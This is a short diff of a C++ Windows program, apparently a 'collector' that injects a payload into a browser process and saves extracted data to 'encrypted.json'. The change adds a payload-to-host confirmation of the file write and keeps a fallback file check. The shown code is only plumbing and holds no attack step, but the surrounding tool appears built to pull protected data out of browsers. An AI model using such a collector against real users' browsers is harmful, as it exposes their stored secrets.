@@ -180,7 +180,11 @@ int wmain(int argc, wchar_t* argv[]) {
             pipe.SendConfig(verbose, false, output);
             log << "Configuration sent to payload" << std::endl;
             log.flush();
-            pipe.ProcessMessages(verbose);
+
+            // Use ProcessMessagesWithConfirmation to get file write status from payload
+            bool payloadSuccess = false;
+            std::string payloadError;
+            pipe.ProcessMessagesWithConfirmation(verbose, payloadSuccess, payloadError);
             log << "Message processing completed" << std::endl;
             log.flush();
 
@@ -203,17 +207,31 @@ int wmain(int argc, wchar_t* argv[]) {
                 procMgr.Terminate();
             }
 
-            // Verify that encrypted.json was actually created
-            std::filesystem::path jsonPath = output / "encrypted.json";
-            if (std::filesystem::exists(jsonPath) && std::filesystem::file_size(jsonPath) > 0) {
+            // Check payload confirmation status first
+            if (payloadSuccess) {
                 fileSaved = true;
-                console.Success("Encrypted data saved to " + jsonPath.string());
-                log << "File verified: " << jsonPath.string() << " size " << std::filesystem::file_size(jsonPath) << std::endl;
+                console.Success("Encrypted data saved successfully");
+                log << "Payload confirmed file write success" << std::endl;
+                log.flush();
+            }
+            else if (!payloadError.empty()) {
+                console.Error("Payload file write failed: " + payloadError);
+                log << "ERROR: Payload reported file write failure: " << payloadError << std::endl;
+                log.flush();
             }
             else {
-                console.Error("Failed to save encrypted data – file missing or empty");
-                log << "ERROR: encrypted.json not found or empty after browser process exit" << std::endl;
-                log << "Check %temp%\\collector_payload_debug.log for details" << std::endl;
+                // Fallback: verify that encrypted.json was actually created
+                std::filesystem::path jsonPath = output / "encrypted.json";
+                if (std::filesystem::exists(jsonPath) && std::filesystem::file_size(jsonPath) > 0) {
+                    fileSaved = true;
+                    console.Success("Encrypted data saved to " + jsonPath.string());
+                    log << "File verified: " << jsonPath.string() << " size " << std::filesystem::file_size(jsonPath) << std::endl;
+                }
+                else {
+                    console.Error("Failed to save encrypted data – file missing or empty");
+                    log << "ERROR: encrypted.json not found or empty after browser process exit" << std::endl;
+                    log << "Check %temp%\\collector_payload_debug.log for details" << std::endl;
+                }
             }
         }
         catch (const std::exception& e) {
